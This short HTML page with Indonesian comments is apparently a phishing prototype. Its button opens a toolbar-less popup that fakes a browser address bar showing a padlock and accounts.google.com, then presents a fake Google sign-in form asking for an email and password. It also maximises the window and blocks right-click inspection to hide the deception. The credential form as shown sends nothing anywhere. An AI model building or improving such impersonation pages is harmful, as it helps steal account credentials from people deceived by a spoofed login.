<!DOCTYPE html>
<html>
<body>
<button onclick="stealthFullscreen()">Open Secure Portal</button>

<script>
function stealthFullscreen() {
    // Coba method lain tanpa fullscreen API
    let win = window.open("", "_blank", "width=1200,height=800,location=no,toolbar=no,menubar=no,status=no");
    
    let content = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Google Accounts</title>
        <style>
            body { 
                margin: 0; 
                font-family: Arial; 
                background: white;
                overflow: hidden;
                height: 100vh;
            }
            /* Fake browser UI tanpa fullscreen */
            .fake-chrome {
                background: #202124;
                padding: 10px;
                display: flex;
                align-items: center;
                gap: 10px;
            }
            .fake-url {
                color: white;
                font-family: monospace;
                font-size: 13px;
            }
        </style>
    </head>
    <body>
        <div class="fake-chrome">
            <div style="color: white">ðŸ”’</div>
            <div class="fake-url">https://accounts.google.com</div>
        </div>
        
        <div style="padding: 40px; text-align: center">
            <h2>Google Login</h2>
            <input type="email" placeholder="Email">
            <br><br>
            <input type="password" placeholder="Password">
            <br><br>
            <button>Sign in</button>
        </div>
        
        <script>
            // Tidak pakai fullscreen, hanya maximize window
            window.moveTo(0, 0);
            window.resizeTo(screen.width, screen.height);
            
            // Prevent right-click inspection
            document.addEventListener('contextmenu', e => e.preventDefault());
        <\/script>
    </body>
    </html>`;
    
    win.document.write(content);
    win.document.close();
}
</script>
</body>
</html>
